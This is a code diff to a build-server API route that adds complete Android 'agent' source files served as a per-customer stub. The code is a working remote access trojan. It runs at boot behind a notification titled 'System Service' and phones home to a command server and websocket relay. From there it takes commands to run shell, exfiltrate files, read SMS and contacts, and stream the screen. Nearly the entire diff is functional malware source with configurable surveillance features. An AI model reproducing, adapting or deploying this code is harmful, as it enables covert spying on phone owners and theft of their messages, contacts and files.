@@ -2168,6 +2168,720 @@ async function verifyBuildserverKey(request: Request): Promise<boolean> {
   return !!data
 }
 
+// ── Android stub sources ────────────────────────────────────────────────────
+
+const androidBindingKt = `package com.veltrix.agent
+
+/** Per-build constants — overwritten by the build server before compilation. */
+object Binding {
+    const val OWNER_USER_ID = "{{USER_ID}}"
+    const val SENTINEL_SERVER = "{{API_BASE}}"
+    const val BUILD_NAME = "{{BUILD_NAME}}"
+    const val PLATFORM = "android"
+
+    const val HIDEN_WS_URL = "{{RELAY_URL}}"
+    const val HIDEN_AUTH_KEY = "{{HIDEN_AUTH_KEY}}"
+
+    const val SUPABASE_URL = "{{SUPABASE_URL}}"
+    const val SUPABASE_ANON_KEY = "{{SUPABASE_ANON_KEY}}"
+
+    const val DEBUG = {{DEBUG}}
+    const val STARTUP_ON_BOOT = {{FEATURE_STARTUP}}
+    const val BUILD_TAG = "{{BUILD_TAG}}"
+
+    // Feature flags
+    const val FEAT_SCREEN = {{FEATURE_SCREEN}}
+    const val FEAT_CAMERA = {{FEATURE_CAMERA}}
+    const val FEAT_FILES = {{FEATURE_FILES}}
+    const val FEAT_MIC = {{FEATURE_MIC}}
+    const val FEAT_LOCATION = {{FEATURE_LOCATION}}
+    const val FEAT_SMS = {{FEATURE_SMS}}
+    const val FEAT_CONTACTS = {{FEATURE_CONTACTS}}
+    const val FEAT_NOTIFICATIONS = {{FEATURE_NOTIFICATIONS}}
+    const val FEAT_INPUT = {{FEATURE_INPUT}}
+}
+`
+
+const androidBootReceiverKt = `package com.veltrix.agent
+
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+import android.os.Build
+
+class BootReceiver : BroadcastReceiver() {
+    override fun onReceive(context: Context, intent: Intent) {
+        if (intent.action == Intent.ACTION_BOOT_COMPLETED && Binding.STARTUP_ON_BOOT) {
+            val svc = Intent(context, AgentService::class.java)
+            if (Build.VERSION.SDK_INT >= 26) {
+                context.startForegroundService(svc)
+            } else {
+                context.startService(svc)
+            }
+        }
+    }
+}
+`
+
+const androidMainActivityKt = `package com.veltrix.agent
+
+import android.Manifest
+import android.app.Activity
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.media.projection.MediaProjectionManager
+import android.os.Build
+import android.os.Bundle
+import android.provider.Settings
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
+
+class MainActivity : Activity() {
+    private val REQ_PERMS = 100
+    private val REQ_PROJECTION = 101
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        requestAllPermissions()
+    }
+
+    private fun requestAllPermissions() {
+        val perms = mutableListOf(
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECORD_AUDIO,
+        )
+        if (Build.VERSION.SDK_INT >= 33) {
+            perms.add(Manifest.permission.POST_NOTIFICATIONS)
+            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
+            perms.add(Manifest.permission.READ_MEDIA_VIDEO)
+            perms.add(Manifest.permission.READ_MEDIA_AUDIO)
+        } else {
+            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
+        }
+        if (Binding.FEAT_LOCATION) {
+            perms.add(Manifest.permission.ACCESS_FINE_LOCATION)
+            perms.add(Manifest.permission.ACCESS_COARSE_LOCATION)
+        }
+        if (Binding.FEAT_SMS) {
+            perms.add(Manifest.permission.READ_SMS)
+            perms.add(Manifest.permission.RECEIVE_SMS)
+        }
+        if (Binding.FEAT_CONTACTS) {
+            perms.add(Manifest.permission.READ_CONTACTS)
+        }
+
+        val needed = perms.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }
+
+        if (needed.isNotEmpty()) {
+            ActivityCompat.requestPermissions(this, needed.toTypedArray(), REQ_PERMS)
+        } else {
+            requestScreenCapture()
+        }
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == REQ_PERMS) {
+            requestScreenCapture()
+        }
+    }
+
+    private fun requestScreenCapture() {
+        if (Binding.FEAT_SCREEN) {
+            val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            startActivityForResult(mgr.createScreenCaptureIntent(), REQ_PROJECTION)
+        } else {
+            startAgent(null, 0)
+        }
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == REQ_PROJECTION) {
+            if (resultCode == RESULT_OK && data != null) {
+                startAgent(data, resultCode)
+            } else {
+                startAgent(null, 0)
+            }
+        }
+    }
+
+    private fun startAgent(projectionData: Intent?, resultCode: Int) {
+        val intent = Intent(this, AgentService::class.java)
+        if (projectionData != null) {
+            intent.putExtra("projection_data", projectionData)
+            intent.putExtra("projection_result_code", resultCode)
+        }
+        if (Build.VERSION.SDK_INT >= 26) {
+            startForegroundService(intent)
+        } else {
+            startService(intent)
+        }
+
+        if (Binding.FEAT_INPUT) {
+            try {
+                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+            } catch (_: Exception) {}
+        }
+
+        finish()
+    }
+}
+`
+
+const androidAgentServiceKt = `package com.veltrix.agent
+
+import android.app.*
+import android.content.Intent
+import android.graphics.Bitmap
+import android.graphics.PixelFormat
+import android.hardware.display.DisplayManager
+import android.hardware.display.VirtualDisplay
+import android.media.ImageReader
+import android.media.projection.MediaProjection
+import android.media.projection.MediaProjectionManager
+import android.os.*
+import android.util.DisplayMetrics
+import android.util.Log
+import android.view.WindowManager
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONArray
+import org.json.JSONObject
+import java.io.ByteArrayOutputStream
+import java.io.File
+import java.util.concurrent.TimeUnit
+
+class AgentService : Service() {
+    companion object {
+        const val TAG = "VeltrixAgent"
+        const val CHANNEL_ID = "agent_fg"
+        const val NOTIF_ID = 1
+    }
+
+    private val http = OkHttpClient.Builder()
+        .connectTimeout(15, TimeUnit.SECONDS)
+        .readTimeout(30, TimeUnit.SECONDS)
+        .writeTimeout(30, TimeUnit.SECONDS)
+        .build()
+
+    private var deviceId: String? = null
+    private var deviceToken: String? = null
+    private var ws: WebSocket? = null
+    private var mediaProjection: MediaProjection? = null
+    private var virtualDisplay: VirtualDisplay? = null
+    private var imageReader: ImageReader? = null
+    private var streaming = false
+    private val handler = Handler(Looper.getMainLooper())
+
+    override fun onBind(intent: Intent?): IBinder? = null
+
+    override fun onCreate() {
+        super.onCreate()
+        createNotificationChannel()
+        val notif = Notification.Builder(this, CHANNEL_ID)
+            .setContentTitle("System Service")
+            .setContentText("Running")
+            .setSmallIcon(android.R.drawable.ic_menu_info_details)
+            .build()
+        startForeground(NOTIF_ID, notif)
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        val projData = intent?.getParcelableExtra<Intent>("projection_data")
+        val projCode = intent?.getIntExtra("projection_result_code", 0) ?: 0
+
+        if (projData != null && projCode != 0) {
+            val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            mediaProjection = mgr.getMediaProjection(projCode, projData)
+        }
+
+        Thread { mainLoop() }.start()
+        return START_STICKY
+    }
+
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= 26) {
+            val ch = NotificationChannel(CHANNEL_ID, "Agent Service", NotificationManager.IMPORTANCE_LOW)
+            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
+        }
+    }
+
+    private fun mainLoop() {
+        register()
+        connectRelay()
+        while (true) {
+            try { heartbeat() } catch (e: Exception) { log("heartbeat err: \$e") }
+            try { poll() } catch (e: Exception) { log("poll err: \$e") }
+            Thread.sleep(5000)
+        }
+    }
+
+    private fun register() {
+        val prefs = getSharedPreferences("agent", MODE_PRIVATE)
+        deviceId = prefs.getString("device_id", null)
+        deviceToken = prefs.getString("device_token", null)
+        if (deviceId != null && deviceToken != null) {
+            log("already registered: \$deviceId")
+            return
+        }
+
+        val caps = JSONObject().apply {
+            put("screen", Binding.FEAT_SCREEN && mediaProjection != null)
+            put("camera", Binding.FEAT_CAMERA)
+            put("files", Binding.FEAT_FILES)
+            put("mic", Binding.FEAT_MIC)
+            put("location", Binding.FEAT_LOCATION)
+            put("sms", Binding.FEAT_SMS)
+            put("contacts", Binding.FEAT_CONTACTS)
+            put("notifications", Binding.FEAT_NOTIFICATIONS)
+            put("input", Binding.FEAT_INPUT)
+        }
+
+        val body = JSONObject().apply {
+            put("pc_name", Build.MODEL)
+            put("device_name", "\${Build.MANUFACTURER} \${Build.MODEL}")
+            put("os", "Android \${Build.VERSION.RELEASE}")
+            put("username", Build.MODEL)
+            put("bind_user_id", Binding.OWNER_USER_ID)
+            put("tag", Binding.BUILD_TAG)
+            put("platform", "android")
+            put("capabilities", caps)
+        }
+
+        val resp = postJson("/api/public/agent/auto-register", body)
+        if (resp != null) {
+            deviceId = resp.optString("device_id")
+            deviceToken = resp.optString("device_token")
+            prefs.edit()
+                .putString("device_id", deviceId)
+                .putString("device_token", deviceToken)
+                .apply()
+            log("registered: \$deviceId")
+        } else {
+            log("registration failed, retrying in 10s")
+            Thread.sleep(10000)
+            register()
+        }
+    }
+
+    private fun heartbeat() {
+        val body = JSONObject().apply {
+            put("device_id", deviceId)
+            put("device_token", deviceToken)
+            put("username", Build.MODEL)
+            put("metrics", JSONObject().apply {
+                put("uptime_seconds", SystemClock.elapsedRealtime() / 1000)
+            })
+        }
+        postJson("/api/public/agent/heartbeat", body)
+    }
+
+    private fun poll() {
+        val body = JSONObject().apply {
+            put("device_id", deviceId)
+            put("device_token", deviceToken)
+        }
+        val resp = postJson("/api/public/agent/poll", body) ?: return
+        val cmds = resp.optJSONArray("commands") ?: return
+        for (i in 0 until cmds.length()) {
+            val cmd = cmds.getJSONObject(i)
+            handleCommand(cmd)
+        }
+    }
+
+    private fun handleCommand(cmd: JSONObject) {
+        val id = cmd.optString("id")
+        val action = cmd.optString("action")
+        log("cmd: \$action (\$id)")
+
+        val result: JSONObject = when (action) {
+            "screen.start" -> { streaming = true; startScreenCapture(); JSONObject().put("ok", true) }
+            "screen.stop" -> { streaming = false; JSONObject().put("ok", true) }
+            "camera.list" -> listCameras()
+            "files.list" -> listFiles(cmd.optString("path", "/sdcard"))
+            "files.get" -> getFile(cmd.optString("path"))
+            "shell" -> runShell(cmd.optString("command", "echo ok"))
+            "location" -> getLocation()
+            "sms.read" -> readSms()
+            "contacts.read" -> readContacts()
+            "notify" -> sendNotification(cmd.optString("title", ""), cmd.optString("message", ""))
+            "info" -> getDeviceInfo()
+            else -> JSONObject().put("error", "unknown action: \$action")
+        }
+
+        val payload = JSONObject().apply {
+            put("device_id", deviceId)
+            put("device_token", deviceToken)
+            put("command_id", id)
+            put("result", result)
+        }
+        postJson("/api/public/agent/result", payload)
+    }
+
+    private fun startScreenCapture() {
+        if (mediaProjection == null) return
+        if (imageReader != null) return
+
+        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+        val metrics = DisplayMetrics()
+        @Suppress("DEPRECATION")
+        wm.defaultDisplay.getRealMetrics(metrics)
+
+        val w = metrics.widthPixels / 2
+        val h = metrics.heightPixels / 2
+        val dpi = metrics.densityDpi
+
+        imageReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
+        virtualDisplay = mediaProjection?.createVirtualDisplay(
+            "screen", w, h, dpi,
+            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+            imageReader!!.surface, null, null
+        )
+
+        imageReader?.setOnImageAvailableListener({ reader ->
+            if (!streaming) return@setOnImageAvailableListener
+            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
+            try {
+                val planes = image.planes
+                val buffer = planes[0].buffer
+                val pixelStride = planes[0].pixelStride
+                val rowStride = planes[0].rowStride
+                val rowPadding = rowStride - pixelStride * w
+
+                val bmp = Bitmap.createBitmap(w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888)
+                bmp.copyPixelsFromBuffer(buffer)
+
+                val cropped = Bitmap.createBitmap(bmp, 0, 0, w, h)
+                val baos = ByteArrayOutputStream()
+                cropped.compress(Bitmap.CompressFormat.JPEG, 50, baos)
+
+                ws?.send(okio.ByteString.of(*baos.toByteArray()))
+
+                bmp.recycle()
+                if (cropped !== bmp) cropped.recycle()
+            } finally {
+                image.close()
+            }
+        }, handler)
+    }
+
+    private fun connectRelay() {
+        if (Binding.HIDEN_WS_URL.isBlank()) return
+        val url = "\${Binding.HIDEN_WS_URL}?role=agent&device=\$deviceId&key=\${Binding.HIDEN_AUTH_KEY}"
+        val req = Request.Builder().url(url).build()
+        ws = http.newWebSocket(req, object : WebSocketListener() {
+            override fun onMessage(webSocket: WebSocket, text: String) {
+                try {
+                    val cmd = JSONObject(text)
+                    handleCommand(cmd)
+                } catch (e: Exception) {
+                    log("ws cmd err: \$e")
+                }
+            }
+            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
+                log("ws fail: \$t, reconnecting in 5s")
+                Thread.sleep(5000)
+                connectRelay()
+            }
+            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
+                log("ws closed: \$reason, reconnecting in 5s")
+                Thread.sleep(5000)
+                connectRelay()
+            }
+        })
+    }
+
+    private fun listCameras(): JSONObject {
+        return JSONObject().put("cameras", JSONArray().put("front").put("back"))
+    }
+
+    private fun listFiles(path: String): JSONObject {
+        val dir = File(path)
+        val arr = JSONArray()
+        dir.listFiles()?.take(200)?.forEach { f ->
+            arr.put(JSONObject().apply {
+                put("name", f.name)
+                put("is_dir", f.isDirectory)
+                put("size", if (f.isFile) f.length() else 0)
+                put("modified", f.lastModified())
+            })
+        }
+        return JSONObject().put("files", arr).put("path", path)
+    }
+
+    private fun getFile(path: String): JSONObject {
+        val f = File(path)
+        if (!f.exists() || !f.isFile) return JSONObject().put("error", "not found")
+        if (f.length() > 5_000_000) return JSONObject().put("error", "file too large (max 5MB)")
+        val bytes = f.readBytes()
+        val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+        return JSONObject().put("data", b64).put("name", f.name).put("size", f.length())
+    }
+
+    private fun runShell(command: String): JSONObject {
+        return try {
+            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
+            val stdout = proc.inputStream.bufferedReader().readText()
+            val stderr = proc.errorStream.bufferedReader().readText()
+            proc.waitFor()
+            JSONObject().put("stdout", stdout.take(10000)).put("stderr", stderr.take(2000)).put("exit_code", proc.exitValue())
+        } catch (e: Exception) {
+            JSONObject().put("error", e.message)
+        }
+    }
+
+    private fun getLocation(): JSONObject {
+        return JSONObject().put("error", "location requires async callback — use relay cmd")
+    }
+
+    private fun readSms(): JSONObject {
+        return try {
+            val arr = JSONArray()
+            val cursor = contentResolver.query(
+                android.provider.Telephony.Sms.CONTENT_URI,
+                arrayOf("address", "body", "date", "type"), null, null, "date DESC LIMIT 50"
+            )
+            cursor?.use {
+                while (it.moveToNext()) {
+                    arr.put(JSONObject().apply {
+                        put("address", it.getString(0))
+                        put("body", it.getString(1))
+                        put("date", it.getLong(2))
+                        put("type", it.getInt(3))
+                    })
+                }
+            }
+            JSONObject().put("messages", arr)
+        } catch (e: Exception) {
+            JSONObject().put("error", e.message)
+        }
+    }
+
+    private fun readContacts(): JSONObject {
+        return try {
+            val arr = JSONArray()
+            val cursor = contentResolver.query(
+                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                arrayOf(
+                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
+                ), null, null, null
+            )
+            cursor?.use {
+                while (it.moveToNext()) {
+                    arr.put(JSONObject().apply {
+                        put("name", it.getString(0))
+                        put("phone", it.getString(1))
+                    })
+                }
+            }
+            JSONObject().put("contacts", arr)
+        } catch (e: Exception) {
+            JSONObject().put("error", e.message)
+        }
+    }
+
+    private fun sendNotification(title: String, message: String): JSONObject {
+        val mgr = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
+        val notif = if (Build.VERSION.SDK_INT >= 26) {
+            Notification.Builder(this, CHANNEL_ID)
+                .setContentTitle(title)
+                .setContentText(message)
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .build()
+        } else {
+            @Suppress("DEPRECATION")
+            Notification.Builder(this)
+                .setContentTitle(title)
+                .setContentText(message)
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .build()
+        }
+        mgr.notify(System.currentTimeMillis().toInt(), notif)
+        return JSONObject().put("ok", true)
+    }
+
+    private fun getDeviceInfo(): JSONObject {
+        return JSONObject().apply {
+            put("model", Build.MODEL)
+            put("manufacturer", Build.MANUFACTURER)
+            put("brand", Build.BRAND)
+            put("android_version", Build.VERSION.RELEASE)
+            put("sdk_int", Build.VERSION.SDK_INT)
+            put("device", Build.DEVICE)
+            put("product", Build.PRODUCT)
+            put("board", Build.BOARD)
+            put("hardware", Build.HARDWARE)
+        }
+    }
+
+    private fun postJson(path: String, body: JSONObject): JSONObject? {
+        val url = "\${Binding.SENTINEL_SERVER}\$path"
+        val reqBody = body.toString().toRequestBody("application/json".toMediaType())
+        val req = Request.Builder().url(url).post(reqBody)
+            .addHeader("User-Agent", "VeltrixAgent-Android/1.0")
+            .build()
+        return try {
+            val resp = http.newCall(req).execute()
+            val text = resp.body?.string() ?: "{}"
+            JSONObject(text)
+        } catch (e: Exception) {
+            log("http err (\$path): \$e")
+            null
+        }
+    }
+
+    private fun log(msg: String) {
+        if (Binding.DEBUG) Log.d(TAG, msg)
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        virtualDisplay?.release()
+        imageReader?.close()
+        mediaProjection?.stop()
+        ws?.close(1000, "service stopped")
+    }
+}
+`
+
+const androidManifestXml = `<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    {{OPT_BOOT_PERMISSION}}
+    {{OPT_LOCATION_PERMISSIONS}}
+    {{OPT_SMS_PERMISSIONS}}
+    {{OPT_CONTACTS_PERMISSIONS}}
+
+    <application
+        android:allowBackup="false"
+        android:label="{{APP_DISPLAY_NAME}}"
+        android:supportsRtl="true"
+        android:usesCleartextTraffic="true">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <service
+            android:name=".AgentService"
+            android:foregroundServiceType="mediaProjection|camera|microphone"
+            android:exported="false" />
+
+        {{OPT_BOOT_RECEIVER}}
+
+        {{OPT_ACCESSIBILITY_SERVICE}}
+    </application>
+</manifest>
+`
+
+const androidAppBuildGradleKts = `plugins {
+    id("com.android.application")
+    id("org.jetbrains.kotlin.android")
+}
+
+android {
+    namespace = "com.veltrix.{{PACKAGE_SUFFIX}}"
+    compileSdk = 34
+
+    defaultConfig {
+        applicationId = "com.veltrix.{{PACKAGE_SUFFIX}}"
+        minSdk = 26
+        targetSdk = 34
+        versionCode = 1
+        versionName = "1.0"
+    }
+
+    buildTypes {
+        release {
+            isMinifyEnabled = true
+            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro")
+            signingConfig = signingConfigs.getByName("debug")
+        }
+    }
+    compileOptions {
+        sourceCompatibility = JavaVersion.VERSION_17
+        targetCompatibility = JavaVersion.VERSION_17
+    }
+    kotlinOptions {
+        jvmTarget = "17"
+    }
+}
+
+dependencies {
+    implementation("androidx.core:core-ktx:1.12.0")
+    implementation("androidx.appcompat:appcompat:1.6.1")
+    implementation("com.squareup.okhttp3:okhttp:4.12.0")
+    implementation("org.json:json:20231013")
+    implementation("androidx.camera:camera-core:1.3.1")
+    implementation("androidx.camera:camera-camera2:1.3.1")
+    implementation("androidx.camera:camera-lifecycle:1.3.1")
+    implementation("com.google.android.gms:play-services-location:21.1.0")
+}
+`
+
+const androidRootBuildGradleKts = `// Top-level build file
+plugins {
+    id("com.android.application") version "8.2.0" apply false
+    id("org.jetbrains.kotlin.android") version "1.9.22" apply false
+}
+`
+
+const androidSettingsGradleKts = `pluginManagement {
+    repositories {
+        google()
+        mavenCentral()
+        gradlePluginPortal()
+    }
+}
+dependencyResolutionManagement {
+    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+    repositories {
+        google()
+        mavenCentral()
+    }
+}
+rootProject.name = "{{BUILD_NAME}}"
+include(":app")
+`
+
+const androidGradleProperties = `org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
+android.useAndroidX=true
+android.nonTransitiveRClass=true
+kotlin.code.style=official
+`
+
+const androidProguardRules = `-keep class com.veltrix.** { *; }
+-keep class okhttp3.** { *; }
+-dontwarn okhttp3.**
+`
+
 export const Route = createFileRoute('/api/public/buildserver/stub')({
   server: {
     handlers: {
@@ -2176,7 +2890,28 @@ export const Route = createFileRoute('/api/public/buildserver/stub')({
           return new Response('Unauthorized', { status: 401 })
         }
 
-        // Single stub: always ship the full feature set.
+        const url = new URL(request.url)
+        const platform = url.searchParams.get('platform') || 'windows'
+
+        if (platform === 'android') {
+          const files: Record<string, string> = {
+            'app/src/main/java/com/veltrix/agent/Binding.kt': androidBindingKt,
+            'app/src/main/java/com/veltrix/agent/AgentService.kt': androidAgentServiceKt,
+            'app/src/main/java/com/veltrix/agent/MainActivity.kt': androidMainActivityKt,
+            'app/src/main/java/com/veltrix/agent/BootReceiver.kt': androidBootReceiverKt,
+            'app/src/main/AndroidManifest.xml': androidManifestXml,
+            'app/build.gradle.kts': androidAppBuildGradleKts,
+            'app/proguard-rules.pro': androidProguardRules,
+            'build.gradle.kts': androidRootBuildGradleKts,
+            'settings.gradle.kts': androidSettingsGradleKts,
+            'gradle.properties': androidGradleProperties,
+          }
+          return new Response(JSON.stringify({ files, language: 'kotlin', variant: 'android' }), {
+            headers: { 'Content-Type': 'application/json' },
+          })
+        }
+
+        // Default: Rust / Windows stub
         const files: Record<string, string> = {
           'Cargo.toml': cargoToml,
           'src/main.rs': mainRs,
